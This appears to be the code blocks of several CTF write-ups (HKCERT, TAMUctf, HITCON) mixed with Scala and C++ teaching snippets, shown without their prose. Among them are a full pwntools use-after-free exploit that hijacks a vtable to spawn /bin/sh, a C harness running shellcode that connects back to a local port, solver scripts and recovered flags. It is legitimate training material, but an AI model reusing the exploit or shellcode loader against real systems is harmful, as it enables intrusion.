```sh {.command-line data-prompt="$" data-filter-output="# "}
# GitHub Pages
curl -I https://trebledj.github.io/css/main.css | grep cache-control
# cache-control: max-age=600
# 
# Cloudflare Pages with custom headers
curl -I https://trebledj.me/css/main.css | grep cache-control
# cache-control: public, max-age=14400, must-revalidate
```

```scala
(1, 2);  // Construct a tuple.
val t: (Int, Int) = (3, 4); // Tuple types.
t(0);    // Access a tuple -- returns 3.
t match {
  case (x, y) => ...  // Pattern match on a tuple.
};
```

```scala
def operate(f: Int => Int): Int => Int = { // Function types.
  \(x: Int) -> f(x)   // Lambda.
}
// `operate` is a higher order function since it takes in a function as parameter.

val inc: Int => Int = operate(\(x: Int) -> x + 1);
inc(0); // 1
inc(1); // 2

operate(\(x: Int) -> x * 5)(6); // Currying -- returns 30.
```

```scala
def map(f: Int => Int, xs: Seq[Int]): Seq[Int] = {
    for (x <- xs)
      yield f(x)
}

def plus1(x: Int): Int = {
  x + 1
}

assert(map(plus1, Seq(1, 2, 3)) == Seq(2, 3, 4))
```

```scala
def plus1(x: Int): Int = { x + 1 }
def plus2(x: Int): Int = { x + 1 }
def plus5(x: Int): Int = { x + 1 }

map(plus1, Seq(1, 2, 3))
map(plus2, Seq(1, 2, 3))
map(plus5, Seq(1, 2, 3))
```

```scala
map(x => x + 1, Seq(1, 2, 3))
map(x => x + 2, Seq(1, 2, 3))
map(x => x + 5, Seq(1, 2, 3))
```

```scala
def f(x: Int)(y: Char) = {
    println("int: " + x + "; char: " + y)
}

f(1)('a') // int: 1; char: a
```

```scala
val g = f(10000000)   // g: Char => Unit
g('b')  // int: 10000000; char: b
g('c')  // int: 10000000; char: c
g('d')  // int: 10000000; char: d
```

```sh {data-lang-off}
nc chal.hkcert23.pwnable.hk 28157
```

```sh {data-lang-off}
pip install pyyaml capstone intervaltree pyelftools diff_match_patch
```

```cpp
void print(int i) { /* ... */ }
void print(float f) { /* ... */ }
void print(std::string s) { /* ... */ }
```

```cpp
using namespace std; // FYI, this is discouraged in actual software engineering: https://stackoverflow.com/q/1452721/10239789.

void wordhash(string s) {} // return type: ???

struct TrieNode {
	// Members.
	unordered_map<char, TrieNode*> next_node;
	bool bool1;
	bool bool2;

	// Constructor.
	// Initialise variables. `next_node`'s constructor is called automatically.
	TrieNode() : bool1{false}, bool2{false} {}   // Member Initialiser List: https://cplusplus.com/articles/1vbCpfjN/

	void insert(string s) {} // return type: ???
	void search(string s) {} // return type: ???
	void mix(char cmix) {} // return type: ???
}

int main() {}
```

```cpp
char wordhash(string s)
{
    char hash = 0;
    for (int i = 0; i < s.size(); i++)
        hash ^= s[i];
    return hash;
}
```

```cpp
void mix(char cmix)
{
	unordered_map<char, TrieNode*> new_map;

	// For each edge...
	for (auto it = this->next_node.begin(); it != this->next_node.end(); ++it) {
		auto pair = *it;
		char ch = std::get<0>(pair);
		TrieNode* node = std::get<1>(pair);
		// ...update the character.
		new_map[ch ^ cmix] = node;
	}

	// A new map is used so that old mappings aren't kept.
	// Update the map of the current node.
	this->next_node = new_map;

	// Recurse into child nodes with the same xor key.
	for (auto it = this->next_node.begin(); it != this->next_node.end(); ++it) {
		auto pair = *it;
		char ch = std::get<0>(pair);
		TrieNode* node = std::get<1>(pair);
		node->mix(cmix);
	}
}
```

```diff-asm
- call    _ZSt3getILm0EKcP8TrieNodeERNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERS7_
+ call    _ZSt3getILm0EKcP8TrieNodeERKNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERKS7_
```

```cpp
for (auto it = container.begin(); it != container.end(); ++it) {
	// ...
}
```

```cpp
// String in outer scope.
int main()
{
	std::string s; // <- string constructor called
	if (1) {
		// do stuff
	}
} // <- string destructor called
```

```cpp
// String in inner scope.
int main()
{
	if (1) {
		std::string s; // <- string constructor called
		// do stuff
	}   // <- string destructor called
}
```

```cpp
// Passing lvalue string to normal parameter.
// Copy constructor is called and a temp object is created.
void print(string s);

int main()
{
	std::string s; // <- string constructor called
	if (1) {
		// do stuff
		// ---
		// <- string copy constructor called (copies s to a temporary)
		print(s);
		// <- string destructor (of temporary string) called
		// ---
		// do more stuff
	}
}   // <- string destructor called
```

```cpp
// Passing rvalue string to normal parameter.
// Regular constructor is called and a temp object is created.
void print(string s);

int main()
{
	if (1) {
		// do stuff
		// ---
		// `const char*` literal is implicitly converted to std::string.
		// <- string constructor called (creates a temporary)
		print("Hello world!");
		// <- string destructor (of temporary string) called
		// ---
		// do more stuff
	}
}
```

```cpp
int main()
{
    int opt;
    string str;
    TrieNode* node = new TrieNode();

	// `const char*` literal is implicitly converted to std::string.
    node->insert("\x72\x50\x54\x52\x73\x66\x51\x5a\x79\x72\x75\x4b\x7f\x4e\x4d\x55\x47\x7e\x68\x7e\x72\x51\x42\x71");
	// node->insert(string("...")); also works
    // -- snip --
    // node->insert("...");
    
    node->should_mix = true;

    cout << "Enter [1] for insert string" << endl;
    cout << "Enter [2] for search string" << endl;

    while (true) {
        cout << "Option: ";
        cin >> opt;
        if (opt == 1) {
            cout << "Input string to insert: " << endl;
            cin >> str;
            node->insert(str);
        } else if (opt == 2) {
            cout << "Input string to search: " << endl;
            cin >> str;
            bool res = node->search(str);
            if (res)
                cout << "String " << str << " exists." << endl;
            else
                cout << "String " << str << " does not exists." << endl;
        } else {
            cout << "Bye" << endl;
            return 0;
        }
    }
}
```

```sh
g++ "$@" -fno-asm -std=c++17 -g -o "$binary" "$source"
```

```diff-cpp
  for (auto it = next_node.begin(); it != next_node.end(); ++it) {
-     auto pair = *it;
-     char ch = std::get<0>(pair);
-     TrieNode* node = std::get<1>(pair);
+     auto [ch, node] = *it;
      new_map[ch ^ cmix] = node;
  }
```

```cpp
for (const auto& pr : map) {
  // pr.first, pr.second
}
```

```diff-asm
   ; Extra stack variables!
-  sub     rsp, 0xc8
-  mov     [rbp-0xc8], rdi
+  sub     rsp, 0xb8
+  mov     [rbp-0xb8], rdi
   ; Calling the wrong overload!
-  call    _ZSt3getILm0EKcP8TrieNodeERNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERS7_
+  call    _ZSt3getILm0EKcP8TrieNodeERKNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERKS7_
```

```diff-cpp
- std::get<0>(std::pair<char, TrieNode*>&)
   + std::get<0>(std::pair<char, TrieNode*> const&)
```

```diff-cpp
  for (auto it = next_node.begin(); it != next_node.end(); ++it) {
-     auto [ch, node] = *it;
+     const auto& [ch, node] = *it;
      new_map[ch ^ cmix] = node;
  }
```

```diff-cpp
- for (auto it = next_node.begin(); it != next_node.end(); ++it) {
-     const auto& [ch, node] = *it;
+ for (const auto& [ch, node] : next_node) {
      new_map[ch ^ cmix] = node;
  }
```

```cpp
for (range_decl : range_expr) {
	/* ... */
}
```

```cpp
{
	auto&& __range = range_expr;
	auto __begin = begin; // Usually std::begin(__range)
	auto __end = end;     // ...and std::end(__range).
	for (; __begin != __end; ++__begin) {
		range_decl = *__begin;
		/* ... */
	}
}
```

```text {data-lang-off}
hkcert23{c++stl_i5_ev3rywh3r3_dur1ng_r3v}
```

```cpp
void win() {
    system("/bin/sh");
}

void* win_addr = (void*)&win;
```

```cpp
struct challenges { virtual void solve() { /* ... */ } };
struct forensics : challenges { virtual void solve() { /* ... */ } };
struct reversing : challenges { virtual void solve() { /* ... */ } };
struct pwn : challenges { virtual void solve() { /* ... */ } };
struct web : challenges { virtual void solve() { /* ... */ } };
struct crypto : challenges { virtual void solve() { /* ... */ } };
```

```cpp
// -- Read choice, index from input. --
if (choice == 1) {
    downloaded[index] = new forensics;
}
else if (choice == 2) {
    downloaded[index] = new reversing;
}
// ...
else {
    downloaded[index] = new crypto;
}
```

```cpp
// -- Read index from input. --
downloaded[index]->solve();
delete downloaded[index];
```

```cpp
// -- Read length from input. --
char* writeup = (char*)malloc(length);
fgets(writeup, length, stdin); // Read writeup payload from input.
```

```py
def download_chal(category: int, save_index: int):
    if not (1 <= category <= 5 and 0 <= save_index <= 3):
        raise RuntimeError("bad bad")

    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"> ", str(category).encode())
    p.sendlineafter(b"> ", str(save_index).encode())

def solve_chal(index: int):
    if not (0 <= index <= 3):
        raise RuntimeError("bad bad")
    
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"> ", str(index).encode())

def submit_writeup(content: bytes, length: int = None):
    if length is None:
        length = len(content) + 1
    elif len(content) >= length:
        raise RuntimeError("your math bad bad")
    
    if b'\n' in content:
        raise RuntimeError("bad bad newline")

    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"> ", str(length).encode())
    p.sendlineafter(b"> ", content)
```

```cpp
class Parent {
public:
    // void* vtable; // Implicit, but exists due to virtual functions.
    int parent_data;
    Parent(int data) : parent_data{data} {}

    virtual void foo(int x) { std::cout << "parent (" << parent_data << ") foo: " << x << std::endl; }
    virtual void bar(int x) { std::cout << "parent (" << parent_data << ") bar: " << x << std::endl; }
};

// Inherits Parent::parent_data and Parent::foo.
class Derived : public Parent {
public:
    // void* vtable; // Implicit for same reason as Parent.
    int derived_data;
    Derived(int data, int data2) : Parent{data}, derived_data{data2} {}

    // Overrides Parent::bar.
    virtual void bar(int x) { std::cout << "derived (" << parent_data << ", " << derived_data << ") bar: " << x << std::endl; }
};

int main() {
    Parent p{1};
    p.foo(2); // Parent::foo
    p.bar(3); // Parent::bar

    Derived d{5, 6};
    d.foo(7); // Parent::foo
    d.bar(8); // Derived::bar
}
```

```c
typedef void (*funcptr_t)(); // Type alias for function pointers.

typedef struct {
    funcptr_t* vtable;
    int parent_data;
} Parent;

typedef struct {
    funcptr_t* vtable;
    int parent_data; // Inherited from Parent.
    int derived_data;
} Derived;

// Enumeration of virtual functions.
enum { VFUNCTION_FOO, VFUNCTION_BAR };

// Concrete implementations.
void parent__foo(Parent* p, int x) { printf("parent (%d) foo: %d\n", p->parent_data, x); }
void parent__bar(Parent* p, int x) { printf("parent (%d) bar: %d\n", p->parent_data, x); }
void derived__bar(Derived* d, int x) { printf("derived (%d, %d) bar: %d\n", d->parent_data, d->derived_data, x); }

// Virtual implementations (redirect).
void foo(Parent* p, int x) { p->vtable[VFUNCTION_FOO]((void*)p, x); }
void bar(Parent* p, int x) { p->vtable[VFUNCTION_BAR]((void*)p, x); }

// vtable definitions.
funcptr_t parent__vtable[] = {
    parent__foo,
    parent__bar,
};

funcptr_t derived__vtable[] = {
    parent__foo,
    derived__bar,
};

int main(void) {
    Parent p = {parent__vtable, 1};
    foo(&p, 2); // parent__foo
    bar(&p, 3); // parent__bar.

    Derived d = {derived__vtable, 5, 6};
    foo((Parent*)&d, 7); // parent__foo
    bar((Parent*)&d, 8); // derived__bar.
}
```

```cpp
int main() {
    int* p = new int;
    // Suppose p == 0x404000.
    delete p;
    // Pointer value is still 0x404000, not NULL or anything else.
}
```

```sh {data-language=GDB}
r               # Run the file.
c               # Continue running where we left off.
heap chunks     # View active chunks on the heap.
x /40wx <addr>  # View memory at address as hex data.
x /40wi <addr>  # View memory at address as instructions.
disas <sym>     # Disassemble a symbol.
b *<addr>       # Set a breakpoint at the specified address.
kill            # Useful for stopping the current run in case we make an oopsie and need to restart.
```

```sh {.command-line data-prompt="$" data-continuation-prompt="gef>" data-continuation-str="  "}
gdb ctf_sim  
r  
^C  
heap chunks  
```

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
1  
1  
0
```

```sh {data-language=GDB .command-line data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  "}
^C  
heap chunks
```

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
disas solveChallenge
b *solveChallenge+191
```

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
2  
0
```

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
^C
heap chunks
```

```sh {data-language=GDB .command-line data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  "}
c  
3  
16  
AABBCCDD
```

```sh {data-language=GDB .command-line data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  "}
^C  
heap chunks
```

```py 
# downloaded[0] = new forensics;   (vptr points to forensic's vtable.)
download_chal(1, 0)

# delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)
solve_chal(0)

# Chunk is allocated-- reusing the chunk previously deallocated.
# Overwrite vptr of downloaded[0] with &(&win).
submit_writeup(p64(elf.sym['win_addr']), 0x10)

# downloaded[0]->solve() triggers double dereference (due to virtual function resolution) and calls win()!
solve_chal(0)
```

```py
from pwn import *

binary = 'ctf_sim'

context.binary = binary
context.log_level = 'debug'

elf = ELF(binary)
rop = ROP(binary)

p = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")


def download_chal(category: int, save_index: int):
    if not (1 <= category <= 5 and 0 <= save_index <= 3):
        raise RuntimeError("bad bad")

    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"> ", str(category).encode())
    p.sendlineafter(b"> ", str(save_index).encode())

def solve_chal(index: int):
    if not (0 <= index <= 3):
        raise RuntimeError("bad bad")
    
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"> ", str(index).encode())

def submit_writeup(content: bytes, length: int = None):
    if length is None:
        length = len(content) + 1
    elif len(content) >= length:
        raise RuntimeError("your math bad bad")
    
    if b'\n' in content:
        raise RuntimeError("bad bad newline")

    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"> ", str(length).encode())
    p.sendlineafter(b"> ", content)

# downloaded[0] = new forensics;   (vptr points to forensic's vtable.)
download_chal(1, 0)

# delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)
solve_chal(0)

# Chunk is allocated-- reusing the chunk previously deallocated.
# Overwrite vptr of downloaded[0] with &(&win).
submit_writeup(p64(elf.sym['win_addr']), 0x10)

# downloaded[0]->solve() triggers double dereference (due to virtual function resolution) and calls win()!
solve_chal(0)

p.interactive()
```

```text {data-lang-off}
gigem{h34pl355_1n_53477l3}
```

```py {data-label=solver-template.py}
from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="labyrinth")
for binary in range(5):
  with open("elf", "wb") as file:
    file.write(bytes.fromhex(p.recvline().rstrip().decode()))

  # send whatever data you want
  p.sendline(b"howdy".hex())
p.interactive()
```

```sh {.command-line data-prompt="$" data-output=2-7}
checksec elf
[*] '/Users/<redacted>/labyrinth/elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```py
from angr import *
from pwn import *

def solve(file='elf'):
    p = Project(file)
    elf = ELF(file)

    # Find target address.
    start_addr = 0x4011b3
    tar_addr = 0x4011c8
```

```py
state = p.factory.entry_state(addr=start_addr) # Construct the state when we "start" the executable at `start_addr`.
simgr = p.factory.simgr(state) # Get a simulation manager. This will... manage our simulations.
simgr.explore(find=tar_addr)  # GOGOGO!!!
```

```py
# Construct a CFG from the 1000 functions. 
# Restrict analysis to the relevant region to save time.
region = [(0x401155, 0x400000 + elf.sym['__libc_csu_init'])]
cfg = p.analyses.CFGFast(regions=region)

# Get networkx nodes for start and target addresses in CFG.
src_node = cfg.model.get_any_node(start_addr, anyaddr=True)
tar_node = cfg.model.get_any_node(tar_addr, anyaddr=True)

# Ensure nodes exist. shortest_path works differently if a node is None.
assert src_node is not None and tar_node is not None

# Construct the shortest path from src to tar. This will be a list of CFGNodes.
from networkx import shortest_path
path = shortest_path(cfg.graph, src_node, tar_node)
```

```py
# Walk through the rest of the path.
state = p.factory.blank_state(addr=start_addr)
for node in path:
    # Let the simulator engine works its magic.
    simgr = p.factory.simgr(state)
    simgr.explore(find=node.addr)
    assert len(simgr.found) > 0
    
    # Keep the found state for next iteration.
    state = simgr.found[0]
```

```py
# Get input which will get us from main to exit(0).
chain = state.posix.dumps(0)
return chain
```

```py
from angr import *
from networkx import shortest_path
from pwn import *


def solve(file='elf'):
    p = Project(file)
    elf = ELF(file)

    # Find target address.
    start_addr = 0x4011b3
    tar_addr = 0x4011c8

    # Construct a CFG from the 1000 functions.
    # Restrict analysis to the relevant region to reduce time.
    region = [(0x401155, 0x400000 + elf.sym['__libc_csu_init'])]
    cfg = p.analyses.CFGFast(regions=region)

    # Get networkx nodes for start and target addresses in CFG.
    src_node = cfg.model.get_any_node(start_addr, anyaddr=True)
    tar_node = cfg.model.get_any_node(tar_addr, anyaddr=True)

    # Ensure nodes exist. shortest_path works differently if a node is None.
    assert src_node is not None and tar_node is not None

    # Construct the shortest path from src to tar. This will be a list of CFGNodes.
    path = shortest_path(cfg.graph, src_node, tar_node)

    # Walk through the rest of the path.
    state = p.factory.blank_state(addr=start_addr)
    for node in path:
        # Let the simulator engine works its magic.
        simgr = p.factory.simgr(state)
        simgr.explore(find=node.addr)
        assert len(simgr.found) > 0
        
        # Keep the found state for next iteration.
        state = simgr.found[0]

    # Get input which will get us from main to exit(0).
    chain = state.posix.dumps(0)
    print(chain)

    return chain


p = remote("tamuctf.com", 443, ssl=True, sni="labyrinth")

for binary in range(5):
    # Read input and save as binary.
    with open("elf", "wb") as file:
        file.write(bytes.fromhex(p.recvline().rstrip().decode()))
    
    # Solve and print.
    out = solve()
    p.sendline(out.hex().encode())

p.interactive()
```

```text {data-lang-off} {data-lang-off}
gigem{w0w_y0ur3_r34lly_600d_w17h_m4z35}
```

```bash
strings cryptor-exe | grep -Ev '^_Z.*' # Filter out most C++ symbols. (Manually leaf through the rest.)
strings cryptor-exe | grep '/'         # Search for endpoint or MIME type.
```

```c
int main() {
    uint32_t st[12] = {};

    // Obtained from binary (static_key symbol).
    unsigned char key[] = "\xf2\x9c\x0b\xf1\xc5\x1a\x7e\x65\x75\x80\x23\x6e\x8b\x74\x38\xbf\x59\x39\x8a\x1a\x05\xc6\x43\xfa\x1d\x57\x82\x0a\xb9\xc6\xdc\x50";
    
    // Obtained by decoding Base64.
    unsigned char iv[] = "\xe2\x4f\x76\x18\xd8\xa3\xa\xaf\xa8\xbf\xee\xe6\x5c\xe9\x4\x1e";
    unsigned char tag[] = "\xd0\x5b\x4c\x60\x6d\x88\x3f\x18\xff\xa8\x58\x43\xfc\xd2\xc6\xac";
    unsigned char c[] = "\xe4\xa\xf2\xb3\x96\x3c\x7a\x9a\x86\xe1\xa4\x9e\x45\xc5\xef\x7f\xe4\x8a\x96\x13\x4a\x95\x8\xc8\xdb\x6c\x7c\xa2\x34\x6f\xf4\x37\xae\xd0\x46\x1\xb2\xd0\xc\x32\xbb\x3e\xb6\xf9\xe6\x51\x5e\x6e\x14\xb\x97\x5b\x99\xd\xda\x3a\xf3\xe0\xd2\x66\xed\xe8\x7a\xbc\x6e\xc\xab\xec";
    
    uc_state_init(st, key, iv);
    
    size_t len = strlen((char*)c);
    int res = uc_decrypt(st, c, len, tag, 16);
    printf("result: %d\n", res);
    printf("%s\n", c);
}
```

```text {data-lang-off}
hkcert22{n3v3r_s4w_4n_c++_ap1_s3Rv3R?m3_n31th3r_bb4t_17_d0e5_eX15ts}
```

```python
encoded = base64.b64encode(message).decode().rstrip('=')
```

```python
encrypted = ''.join([charmap[c] for c in encoded])
```

```python
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

def get_chars_with_mask(m):
    """Get Base64 chars which are masked with m."""
    return {c for i, c in enumerate(charset) if (i & m) == m}

# List the 4 Base64 positions. We'll cycle through these positions (i.e. i % 4).
msbs = [0b100000, 0b001000, 0b000010, 0b000000]

# Get impossible characters for each position.
subchars = [get_chars_with_mask(m) for m in msbs]

# Create a blacklist for each Base64 char.
# e.g. blacklist['A'] returns the set of chars which 'A' can NOT map to.
blacklist = {c: set() for c in charset}

# Loop through each char in the shuffled Base64 text.
for i, c in enumerate(txt):
    # Ignore char mappings which have '1' in corresponding msb.
    # These can't map to a printable ASCII char.
    blacklist[c] |= subchars[i % 4]

# Invert the blacklist to get a dictionary of possible mappings.
# e.g. whitelist['A'] returns the set of chars which 'A' CAN map to.
whitelist = {k: set(charset) - v for k, v in blacklist.items()}
```

```python
print(''.join(sorted(blacklist['J'])))
# '+/0123456789CDGHKLOPSTWXabefghijklmnopqrstuvwxyz'
```

```python
print(''.join(sorted(whitelist['J']))
# 'ABEFIJMNQRUVYZcd'
```

```python
def get_inverted_chars_with_mask(m):
    return {c for i, c in enumerate(charset) if ((2**6 - 1 - i) & m) == m}

# chars that don't have bits set in ascii.
subchars_not_in_ascii = [get_inverted_chars_with_mask(m) for m in in_ascii]
```

```text {data-lang-off}
V2UncmUgbm8gc3RyYW5nZXJzIHRvIGxvdmUKWW91IGtub3cgdGhlIHJ1bGVzIGFuZCBzbyBkbyBJIChkbyBJKQpBIGZ1bGwgY29tbWl0bWVudCdzIHdoYXQgSSdtIHRoaW5raW5nIG9mCllvdSB3b3VsZG4ndCBnZXQgdGhpcyBmcm9tIGFueSBvdGhlciBndXkKSSBqdXN0IHdhbm5hIHRlbGwgeW91IGhvdyBJJ20gZmVlbGluZwpHb3R0YSBtYWtlIHlvdSB1bmRlcnN0YW5kCk5ldmVyIGdvbm5hIGdpdmUgeW91IHVwCk5ldmVyIGdvbm5hIGxldCB5b3UgZG93bgpOZXZlciBnb25uYSBydW4gYXJvdW5kIGFuZCBkZXNlcnQgeW91Ck5ldmVyIGdvbm5hIG1ha2UgeW91IGNyeQpOZXZlciBnb25uYSBzYXkgZ29vZGJ5ZQpOZXZlciBnb25uYSB0ZWxsIGEgbGllIGFuZCBodXJ0IHlvdQo=
```

```python
# Dictionary of guessed mappings.
# key: shuffled Base64; value: plain Base64
guesses = {
    'w': 'G',       'Y': 'I',
    'o': 'H',       'c': 'B',

    # " the "
    'J': 'R',       'P': 'o',
    '0': 'Z',       'H': 'S',

    # More snipped out.
    ...
}
for c, g in guesses.items():
    # Our guess should be whitelisted!
    assert set(g).issubset(whitelist[c]) for gc in g), f'mismatch for {c} -> {g}, whitelist: {whitelist[c]}'
    whitelist[c] = g # Throw away all other values.
```

```text {data-lang-off}
hkcert22{b4s3_s1x7y_f0ur_1s_4n_3nc0d1n9_n07_4n_encryp710n}
```

```txt {data-lang-off}
server
run
```

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    unsigned char shellcode[] = "\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7";
    ((void (*)(void))(shellcode))();
}

// Compile with:
// gcc main.c  -fno-stack-protector -z execstack && gdb ./a.out
```

```txt {data-lang-off}
flag hitcon{test_flag}
```

```c
if (param_3 != 0x40) {
	auVar27 = <>::from("incorrect/",9);
	return auVar27;
}
```

```txt {data-lang-off}
flag hitcon{AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN}
```

```python
for _ in range(256):
	part1(flag)
	part2(flag)

part3(flag, interesting_data_a7516852)
```

```c
memcpy(&some_buffer,&SOME_ADDRESS,0x200);
n = 0x40;
puVar21 = (ulong *)&some_buffer_offset_by_4;
do {
	uVar23 = puVar21[-1];
	if (0x3f < uVar23)
		goto panic;
	uVar1 = __ptr[n - 1]; // __ptr :: char[]
	__ptr[n - 1] = __ptr[uVar23];
	__ptr[uVar23] = uVar1;
	
	uVar23 = puVar21[0];
	if (0x3f < uVar23)
		goto panic;
	uVar1 = __ptr[n - 2];
	__ptr[n - 2] = __ptr[uVar23];
	__ptr[uVar23] = uVar1;
	
	puVar21 += 2;
	n -= 2;
} while (n != 0);
```

```sh {data-language=GDB .command-line data-prompt="gdb>" data-continuation-prompt=">" data-continuation-str="  " data-filter-output="out>"}
start
out>
out>Break to determine __ptr location.
break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 61
out>Break to grab permuted string.
break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 935
out>
continue  
server  
run  
flag abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/
out>(breakpoint triggered)
out>
out>Get location of __ptr.
p $rax
out>$1 = 0x5555555d63e0
continue
out>(breakpoint triggered)
out>
out>Get permuted string.
x/s 0x5555555d63e0
out>Rp5v+AZmM8XWy1sgNhTB/oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw
```

```python
import string

p = string.ascii_letters + string.digits + '+/'
assert len(p) == 64
print(p)

# Permuted string obtained from GDB.
permuted = 'Rp5v+AZmM8XWy1sgNhTB/oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw'[:64]

perm = [0] * 64  # Permutation 
rperm = [0] * 64 # Reverse permutation

for i, c in enumerate(p):
	j = permuted.index(c)
	perm[i] = j
	rperm[j] = i
```

```c
do {
    uVar23 = 0;
    uVar18 = 1;
    uVar3 = __ptr[lVar20] + 1;
    uVar19 = 0x101;
    do {
        uVar25 = uVar3;
        uVar27 = uVar18;
        uVar3 = uVar19 % uVar25;
        iVar24 = (int)uVar27;
        iVar26 = (int)uVar23;
        uVar23 = uVar27;
        uVar18 = (ulong)(iVar26 - (uVar19 / uVar25) * iVar24);
        uVar19 = uVar25;
    } while ((short)uVar3 != 0);
    __ptr[lVar20] = ((uVar27 & 0xffff) >> 0xf) + uVar27 +
                    ((((uVar27 >> 0xf) - iVar24) + iVar26 & 0xffffU) / 0x101) + 0x71U ^ 0x89;
    lVar20 += 1;
} while (lVar20 != 0x40);
```

```sh {data-language=GDB .command-line data-prompt="gdb>" data-filter-output="out>"}
break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 1070
```

```sh {data-language=GDB .command-line data-prompt="gdb>" data-filter-output="out>"}
x/16wx 0x5555555d63e0
```

```sh {data-language=GDB .command-line data-prompt="gdb>" data-filter-output="out>"}
start
out>
out>Break before the loop.
break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 937
out>Break after the loop.
break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 1070
out>
continue
out>(breakpoint-before-loop triggered)
out>
out>Set 8x8 = 64 bytes. (I used a Python script to generate these `set` cmds from the missing input bytes.)
set *(0x5555555d63e0 as *mut u64) = 0x0001020304050607
set *(0x5555555d63e8 as *mut u64) = 0x08090a0b0c0d0e0f
out>and so on...
set *(0x5555555d6410 as *mut u64) = 0x3c3d3e3f405b5c5d
set *(0x5555555d6418 as *mut u64) = 0x5e5f607b7c7d7e7f
out>
continue
out>(breakpoint-after-loop triggered)
out>
out>Get mapped bytes.
x/16wx 0x5555555d63e0
out>...
out>Repeat until all mappings are deduced...
```

```python
# Values obtained with `x/16wx 0x5555555d63e0`.

# Values before mapping.
dst = """
0x5555555d63e0: 0x76357052      0x6d5a412b      0x5758384d      0x67733179
0x5555555d63f0: 0x4254684e      0x7a436f2f      0x50645659      0x366e4772
0x5555555d6400: 0x5133444b      0x656b6c39      0x46747134      0x30624878
0x5555555d6410: 0x634f5575      0x496a3253      0x4c664a45      0x77696137

0x5555555d63e0: 0x04050607      0x00010203      0x0c0d0e0f      0x08090a0b
0x5555555d63f0: 0x14151617      0x10111213      0x1c1d1e1f      0x18191a1b
0x5555555d6400: 0x24252627      0x20212223      0x2d2e3a3b      0x28292a2c
0x5555555d6410: 0x405b5c5d      0x3c3d3e3f      0x7c7d7e7f      0x5e5f607b

-- snip -- to save space --
"""

# Values after mapping.
mpd = """
0x5555555d63e0: 0x2e616c58      0xe2cb3269      0xa002e0b3      0xc16b1c86
0x5555555d63f0: 0xd2799cec      0x74d9c29e      0x9f043b0c      0xed14031e
0x5555555d6400: 0xca978fa2      0x39a4d8da      0xaf7e645b      0x0f71930b
0x5555555d6410: 0x0a81fd99      0x3aef66b7      0xe1ff00ee      0x09ab75ad

0x5555555d63e0: 0x51158ddb      0xfb7b4ebb      0xaab260eb      0xb0aca58e
0x5555555d63f0: 0x2bc6a635      0x635cde42      0xbd24b1e3      0x3043d65f
0x5555555d6400: 0x7c6d8b17      0x8ca7d52a      0x59a92706      0x9d83fe10
0x5555555d6410: 0x41a880c0      0x25dc5ee7      0xc42d4ff9      0x164d2f6a

-- snip --
"""

def mkbytes(s):
    return [int(bs[2*(i+1):2*(i+2)], 16) for l in s.strip().split('\n') if l.strip() for bs in l.split(': ')[1].split() for i in range(4)]

dbytes = mkbytes(dst)
mbytes = mkbytes(mpd)

mp = [0]*256  # Value map.
rmp = [0]*256 # Reverse value map.
for a, b in zip(dbytes, mbytes):
    mp[a] = b
    rmp[b] = a

# Assert bijection.
assert len(mp) == len(rmp) == 256
```

```c
local_278 = alloc::raw_vec::RawVec<T,A>::allocate_in(0xff,0);
memcpy(local_278._0_8_,&DAT_00162b2b,0xff);
```

```c
local_238 = 0x526851a7;
local_234 = 0x31ff2785;
local_230 = 0xc7d28788;
local_22c = 0x523f23d3;
local_228 = 0xaf1f1055;
local_224 = 0x5c94f027;
// -- snip --
```

```asm
-- snip --
  b2:   0f 05                   syscall             ; read from /dev/zero
  b4:   58                      pop    rax          ; rax = 0
  b5:   48 f7 d0                not    rax          ; exercise for the reader
  b8:   48 c1 e8 1d             shr    rax, 0x1d    ;
  bc:   48 99                   cqo                 ;
  be:   6a 29                   push   0x29         ;
  c0:   59                      pop    rcx          ;
  c1:   48 f7 f1                div    rcx          ;
